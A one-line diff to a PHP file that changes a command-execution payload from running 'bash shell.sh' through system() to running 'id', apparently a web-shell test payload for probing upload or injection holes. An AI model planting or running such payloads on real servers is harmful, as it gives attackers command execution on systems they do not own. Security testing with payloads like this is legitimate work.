@@ -1,1 +1,1 @@
-<?php system("bash shell.sh");  ?>
+<?php system("id");  ?>
